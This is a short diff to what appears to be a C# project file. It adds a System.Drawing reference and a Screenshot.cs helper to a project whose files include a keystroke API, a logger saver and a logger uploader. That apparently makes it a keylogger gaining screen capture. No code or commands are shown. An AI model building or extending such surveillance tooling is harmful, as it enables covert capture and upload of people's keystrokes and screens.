@@ -75,6 +75,7 @@
     </Reference>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
@@ -87,6 +88,7 @@
     <Compile Include="Helpers\KeyboardLayout.cs" />
     <Compile Include="Helpers\LoggerSaver.cs" />
     <Compile Include="Helpers\LoggerUploader.cs" />
+    <Compile Include="Helpers\Screenshot.cs" />
     <Compile Include="Helpers\Window.cs" />
     <Compile Include="KeystrokeAPI.cs" />
     <Compile Include="Entities\KeyCode.cs" />
